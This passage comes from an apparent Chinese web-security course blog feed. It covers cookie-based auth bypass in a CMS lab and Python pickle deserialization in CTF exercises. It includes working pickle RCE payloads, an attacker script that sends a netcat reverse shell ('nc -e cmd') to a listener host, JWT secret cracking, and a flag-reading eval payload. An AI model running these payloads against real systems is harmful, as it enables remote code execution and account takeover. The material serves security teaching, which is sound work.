src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/image-20230222220928870.png" alt="image-20230222220928870"></p><p>访问后台地址登录将会直接登录成功</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/image-20230222220814779.png" alt="image-20230222220814779"></p><h4 id="未授权-脆弱机制-XHCMS-Cookie脆弱验证"><a href="#未授权-脆弱机制-XHCMS-Cookie脆弱验证" class="headerlink" title="#未授权-脆弱机制-XHCMS-Cookie脆弱验证"></a>#未授权-脆弱机制-XHCMS-Cookie脆弱验证</h4><p>3、有验证 验证产生在用户凭据证上  cookie jwt token</p><p>app&#x3D;”熊海内容管理系统(SEACMS)”</p><p>环境靶场：xhcms</p><p>通过代码审计得知，只要cookie认证是user&#x3D;&#x3D;不为空即可</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/3021911-20230203214454269-55199108.png" alt="img"></p><p>（1）找到后台登录入口</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/3021911-20230203215154512-368398547.png" alt="img"></p><p>（2）抓包，添加cookie</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/3021911-20230203215310917-857953540.png" alt="img"></p><p>（3）成功进入后台</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/3021911-20230203221319545-338237601.png" alt="img"></p><h4 id="弱机制-空口令机制-Redis-amp-Weblogic弱机制"><a href="#弱机制-空口令机制-Redis-amp-Weblogic弱机制" class="headerlink" title="#弱机制-空口令机制-Redis&amp;Weblogic弱机制"></a>#弱机制-空口令机制-Redis&amp;Weblogic弱机制</h4><p><a href="http://vulfocus.io/">http://vulfocus.io/</a></p><p><a href="https://vulhub.org/">https://vulhub.org/</a></p><p>“weblogic” &amp;&amp; port&#x3D;”7001”</p><p>redis未授权漏洞产生原因，复现案例：(<a href="https://blog.csdn.net/dreamthe/article/details/123427989">https://blog.csdn.net/dreamthe/article/details/123427989</a>)</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/image-20230222221444489.png" alt="image-20230222221444489"></p><p>weblogic未授权漏洞产生原因，复现案例：(<a href="https://blog.csdn.net/qq_32731075/article/details/117673410">https://blog.csdn.net/qq_32731075/article/details/117673410</a>)</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/image-20230222222429046.png" alt="image-20230222222429046"></p><h4 id="检测类-工具项目-Authz-amp-Secscan-Authcheck"><a href="#检测类-工具项目-Authz-amp-Secscan-Authcheck" class="headerlink" title="#检测类-工具项目-Authz&amp;Secscan-Authcheck"></a>#检测类-工具项目-Authz&amp;Secscan-Authcheck</h4><p>中通安装踩坑：<a href="https://bigyoung.cn/posts/250/">https://bigyoung.cn/posts/250/</a>   </p><p>(<a href="https://sec.bigyoung.cn/article/SecScanAuthcheck/">https://sec.bigyoung.cn/article/SecScanAuthcheck/</a>)</p><p><a href="https://github.com/ztosec/secscan-authcheck">https://github.com/ztosec/secscan-authcheck</a></p><blockquote><p>黑盒测试流程</p><p>（1）先通过工具把所以域名爆破出来，看看有没有含义敏感数据的页面</p><p>（2）在功能点测试中，修改所有和权限挂钩的参数，尝试判断存不存在越权漏洞</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;知识点：&quot;&gt;&lt;a href=&quot;#知识点：&quot; class=&quot;headerlink&quot; title=&quot;#知识点：&quot;&gt;&lt;/a&gt;#知识点：&lt;/h3&gt;&lt;p&gt;1、水平越权-同级用户权限共享&lt;/p&gt;
&lt;p&gt;2、垂直越权-低高用户权限共享&lt;/p&gt;
&lt;p&gt;3、访问控制-验证丢失&amp;am</summary>
      
    
    
    
    <category term="Web攻防" scheme="http://example.com/categories/Web%E6%94%BB%E9%98%B2/"/>
    
    
  </entry>
  
  <entry>
    <title>Day48 WEB攻防-通用漏洞&amp;Py反序列化&amp;链构造&amp;自动审计bandit&amp;魔术方法</title>
    <link href="http://example.com/2023/02/03/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/"/>
    <id>http://example.com/2023/02/03/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/</id>
    <published>2023-02-02T17:52:08.000Z</published>
    <updated>2023-02-21T13:05:31.009Z</updated>
    
    <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、Python-反序列化函数使用</p><p>2、Python-反序列化魔术方法</p><p>3、Python-反序列化POP链构造</p><p>4、Python-自动化审计bandit使用</p><h3 id="前置知识："><a href="#前置知识：" class="headerlink" title="#前置知识："></a>#前置知识：</h3><h5 id="函数使用："><a href="#函数使用：" class="headerlink" title="函数使用："></a>函数使用：</h5><p>pickle.dump(obj, file) : 将对象序列化后保存到文件</p><p>pickle.load(file) : 读取文件， 将文件中的序列化内容反序列化为对象</p><p>pickle.dumps(obj) : 将对象序列化成字符串格式的字节流</p><p>pickle.loads(bytes_obj) : 将字符串格式的字节流反序列化为对象</p><h5 id="魔术方法："><a href="#魔术方法：" class="headerlink" title="魔术方法："></a>魔术方法：</h5><p><strong>reduce</strong>()      反序列化时调用</p><p><strong>reduce_ex</strong>()   反序列化时调用</p><p><strong>setstate</strong>()    反序列化时调用</p><p><strong>getstate</strong>()    序列化时调用</p><h5 id="各类语言函数："><a href="#各类语言函数：" class="headerlink" title="各类语言函数："></a>各类语言函数：</h5><p>Java： Serializable Externalizable接口、fastjson、jackson、gson、ObjectInputStream.read、ObjectObjectInputStream.readUnshared、XMLDecoder.read、ObjectYaml.loadXStream.fromXML、ObjectMapper.readValue、JSON.parseObject等</p><p>PHP： serialize()、 unserialize() </p><p>Python：pickle marshal PyYAML shelve PIL unzip</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ 原理-反序列化魔术方法-调用理解</p><p>➢ CTF-反序列化漏洞利用-构造&amp;RCE</p><p>➢ CTF-CISCN2019华北-JWT&amp;反序列化</p><p>➢ 代码审计-自动化工具-bandit安装及使用</p><h3 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h3><h4 id="原理-反序列化魔术方法-调用理解"><a href="#原理-反序列化魔术方法-调用理解" class="headerlink" title="#原理-反序列化魔术方法-调用理解"></a>#原理-反序列化魔术方法-调用理解</h4><p>-魔术方法利用：</p><p><strong>reduce</strong>()         反序列化时调用</p><p><strong>reduce_ex</strong>()   反序列化时调用</p><p><strong>setstate</strong>()       反序列化时调用</p><p><strong>getstate</strong>()       序列化时调用</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">-代码块：</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment">##### \#反序列化魔术方法调用-__reduce__() __reduce_ex__() __setstate__()</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">​    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">​        <span class="built_in">print</span>(<span class="string">&#x27;反序列化调用&#x27;</span>)</span><br><span class="line">​        <span class="keyword">return</span> (os.system,(<span class="string">&#x27;calc&#x27;</span>,))</span><br><span class="line">a = A()</span><br><span class="line">p_a = pickle.dumps(a)</span><br><span class="line">pickle.loads(p_a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;==========&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(p_a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SerializePerson</span>():</span><br><span class="line">​    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">​        self.name = name</span><br><span class="line"></span><br><span class="line">​    \<span class="comment"># 构造 __setstate__ 方法</span></span><br><span class="line">​    <span class="keyword">def</span> <span class="title function_">__setstate__</span>(<span class="params">self, name</span>):</span><br><span class="line">​        os.system(<span class="string">&#x27;calc&#x27;</span>)  <span class="comment"># 恶意代码</span></span><br><span class="line">tmp = pickle.dumps(SerializePerson(<span class="string">&#x27;tom&#x27;</span>))  <span class="comment">#序列化</span></span><br><span class="line">pickle.loads(tmp)  <span class="comment"># 反序列化 此时会弹出计算器</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\<span class="comment">#序列化魔术方法调用-__getstate__</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">​    <span class="keyword">def</span> <span class="title function_">__getstate__</span>(<span class="params">self</span>):</span><br><span class="line">​        <span class="built_in">print</span>(<span class="string">&#x27;序列化调用&#x27;</span>)</span><br><span class="line">​        os.system(<span class="string">&#x27;calc&#x27;</span>)</span><br><span class="line">a = A()</span><br><span class="line">p_a = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;==========&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(p_a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\<span class="comment">#反序列化安全漏洞产生-DEMO</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">​    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, func, arg</span>):</span><br><span class="line">​        self.func = func</span><br><span class="line">​        self.arg = arg</span><br><span class="line">​        <span class="built_in">print</span>(<span class="string">&#x27;This is A&#x27;</span>)</span><br><span class="line">​    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">​        <span class="built_in">print</span>(<span class="string">&#x27;反序列化调用&#x27;</span>)</span><br><span class="line">​        <span class="keyword">return</span> (self.func, self.arg)</span><br><span class="line">a = A(os.system, (<span class="string">&#x27;calc&#x27;</span>,))</span><br><span class="line">p_a = pickle.dumps(a)</span><br><span class="line">pickle.loads(p_a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;==========&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(p_a)</span><br></pre></td></tr></table></figure><h4 id="CTF-反序列化漏洞利用-构造-amp-RCE"><a href="#CTF-反序列化漏洞利用-构造-amp-RCE" class="headerlink" title="#CTF-反序列化漏洞利用-构造&amp;RCE"></a>#CTF-反序列化漏洞利用-构造&amp;RCE</h4><p>环境介绍：利用Python-flask搭建的web应用，获取当前用户的信息，进行展示，在获取用户的信息时，通过对用户数据进行反序列化获取导致的安全漏洞！</p><p>Server服务器：web应用接收cookie里面的user值，对其进行反序列化操作</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">try</span>:</span><br><span class="line">​        user = base64.b64decode(request.cookies.get(<span class="string">&#x27;user&#x27;</span>))</span><br><span class="line">​        user = pickle.loads(user)</span><br><span class="line">​        username = user[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">​    <span class="keyword">except</span>:</span><br><span class="line">​        username = <span class="string">&quot;Guest&quot;</span></span><br><span class="line">​    <span class="keyword">return</span> <span class="string">&quot;Hello %s&quot;</span> % username</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">​    app.run(</span><br><span class="line">​        host=<span class="string">&#x27;192.168.1.3&#x27;</span>,</span><br><span class="line">​        port=<span class="number">5000</span>,</span><br><span class="line">​        debug=<span class="literal">True</span></span><br><span class="line">​    )</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Hacker服务器：cookie植入user值,user值就是生成的恶意序列化数据</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">​    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">​        s=<span class="string">&#x27;c:/nc -e cmd 192.168.46.137 6666&#x27;</span></span><br><span class="line">​        <span class="keyword">return</span> (os.system, (s,))</span><br><span class="line">e = exp()</span><br><span class="line">s = pickle.dumps(e)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">response = requests.get(<span class="string">&quot;http://192.168.1.3:5000/&quot;</span>, cookies=<span class="built_in">dict</span>(</span><br><span class="line">​    user=base64.b64encode(s).decode()</span><br><span class="line">))</span><br><span class="line"><span class="built_in">print</span>(response.content)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>hacker将反弹shell的命令进行序列化并且base64加密</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221160547454.png" alt="image-20230221160547454"></p><p>在另一台linux服务器上监听5566</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221160840503.png" alt="image-20230221160840503"></p><p>将序列化后base64编码复制下来，在受害者server的网站抓包，并加上cookie一栏，添加user值</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221160938842.png" alt="image-20230221160938842"></p><p>发包后，可获得shell</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221161031516.png" alt="image-20230221161031516"></p><h4 id="CTF-CISCN2019华北-JWT-amp-反序列化"><a href="#CTF-CISCN2019华北-JWT-amp-反序列化" class="headerlink" title="#CTF-CISCN2019华北-JWT&amp;反序列化"></a>#CTF-CISCN2019华北-JWT&amp;反序列化</h4><p>通过提示-&gt;寻找LV6-&gt;购买修改支付逻辑-&gt;绕过admin限制需修改jwt值-&gt;爆破jwt密匙-&gt;重组jwt值成为admin-&gt;购买进入会员中心-&gt;源码找到文件压缩源码-&gt;Python代码审计反序列化-&gt;构造读取flag代码进行序列化打印-&gt;提交获取</p><p>考点1：JWT 身份验证 攻击点：</p><p><a href="https://www.cnblogs.com/vege/p/14468030.html">https://www.cnblogs.com/vege/p/14468030.html</a></p><p><a href="https://github.com/ck00004/c-jwt-cracker">https://github.com/ck00004/c-jwt-cracker</a></p><p>考点2：Python 代码审计 反序列化：</p><p>自动工具：<a href="https://github.com/PyCQA/bandit">https://github.com/PyCQA/bandit</a></p><p>参考资料：<a href="https://github.com/bit4woo/python_sec">https://github.com/bit4woo/python_sec</a></p><p>1、获取LV6</p><p>2、购买后伪造admin身份:</p><p>获取密匙：</p><p>&#x2F;c-jwt-cracker</p><p>.&#x2F;jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InhpYW9kaSJ9.UHCykJtUJ4jeYAWAYFU73QiNhn7mZLUHE7kKo4oJpK8</p><p>重组密文：</p><p>修改jwt网站：<a href="https://jwt.io/">https://jwt.io/</a>  爆破后的密钥：1Kun</p><p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo</p><p>3、代码审计-反序列化</p><p>伪造Admin后发现返回数据包存在源码下载，下载后代码审计：</p><p>测试触发：URL对应代码块：路由-&gt;文件</p><p>触发代码Payload:（源码是2版本）</p><p>要注意对方的python是什么版本，自己就用什么版本书写payload，否则会出错(可以通过一些函数判断如：python2的print内容不需要括号，python3则需要加上括号)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">payload</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">​    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">​       <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="built_in">print</span> a</span><br></pre></td></tr></table></figure><p>Payload：</p><p>c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27&#x2F;flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.</p><h5 id="实现过程："><a href="#实现过程：" class="headerlink" title="实现过程："></a>实现过程：</h5><p>打开发现要找到lv6的</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221162926829.png" alt="image-20230221162926829"></p><p>观察request包发现如果是lv4则有lv4.png,所以通过这个规律用python脚本找到lv6.png在哪一页</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221163107392.png" alt="image-20230221163107392"></p><p>1、获取LV6</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">​    url=<span class="string">&#x27;http://119.45.216.198:8083/shop?page=&#x27;</span>+<span class="built_in">str</span>(i)</span><br><span class="line">​    result=requests.get(url).content</span><br><span class="line">​    <span class="keyword">try</span>:</span><br><span class="line">​        <span class="keyword">if</span> <span class="string">&#x27;lv6.png&#x27;</span> <span class="keyword">in</span> result.decode(<span class="string">&#x27;utf-8&#x27;</span>):</span><br><span class="line">​            <span class="built_in">print</span>(<span class="string">&#x27;-&gt;&#x27;</span>+url+<span class="string">&#x27;|yes&#x27;</span>)</span><br><span class="line">​            <span class="keyword">break</span></span><br><span class="line">​        <span class="keyword">else</span>:</span><br><span class="line">​            <span class="built_in">print</span>(<span class="string">&#x27;-&gt;&#x27;</span> + url + <span class="string">&#x27;|no&#x27;</span>)</span><br><span class="line">​    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">​        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>在181页停止，所以是在181页</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221163255545.png" alt="image-20230221163255545"></p><p>访问url181页</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221163331221.png" alt="image-20230221163331221"></p><p>进入后点击购买lv6发现失败，原因是钱不够</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221163433129.png" alt="image-20230221163433129"></p><p>抓包将折扣0.8改为0.0000000008</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221163558845.png" alt="image-20230221163558845"></p><p>发现需要admin才能改折扣</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221163629740.png" alt="image-20230221163629740"></p><p>刚才抓的数据包发现有jwt验证，考虑尝试修改jwt</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221163738225.png" alt="image-20230221163738225"></p><p>在jwt网站修改为admin，但是发现需要密匙才能修改成功</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221164338263.png" alt="image-20230221164338263"></p><p>所以采取爆破jwt密匙脚本：</p><blockquote><p>cd &#x2F;c-jwt-cracker</p><p>.&#x2F;jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InhpYW9kaSJ9.UHCykJtUJ4jeYAWAYFU73QiNhn7mZLUHE7kKo4oJpK8</p></blockquote><p>爆破出密匙是1KUN</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221165144676.png" alt="image-20230221165144676"></p><p>将jwt复制到刚才的数据包进行替换jwt，放包成功：</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221165242902.png" alt="image-20230221165242902"></p><p>右键源码下有压缩包，由此进入python反序列化利用</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221165430307.png" alt="image-20230221165430307"></p><p>打开源码搜索序列化函数pickle</p><p><img 